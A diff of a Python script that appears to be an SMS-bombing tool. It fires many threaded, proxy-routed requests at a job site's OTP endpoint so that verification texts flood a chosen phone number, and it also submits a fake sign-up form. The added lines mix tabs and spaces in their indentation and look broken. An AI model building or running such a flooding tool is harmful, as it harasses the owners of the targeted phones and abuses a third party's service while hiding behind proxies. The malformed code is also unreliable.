@@ -61,19 +61,15 @@ async def home():
             data=f"mobile_form={phone}&password_form=as257400As&confirmpassword_form=as257400As&name_form=skkdmx&lastname_form=dkmsxm&stype=2"
         )
 
-        for _ in range(jam):
+        
+        def api1(phone):
+            send = Session()
+		          send.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'})
+			         sms = send.post("https://api.jobbkk.com/v1/easy/otp_code",data="mobile="+phone,proxies={'http': 'http://' + random.choice(s)})
+		         	print(f"\x1b[92m{sms}")
+
+         for _ in range(jam):
             threading.Thread(target=api1, args=(phone,)).start()
 
 
-def api1(phone):
-    send = Session()
-    send.headers.update({
-        "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
-        "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
-    })
-    sms = send.post(
-        "https://api.jobbkk.com/v1/easy/otp_code",
-        data=f"mobile={phone}",
-        proxies={'http': 'http://' + random.choice(s)}
-    )
-    print(f"\x1b[92m{sms}")
+        
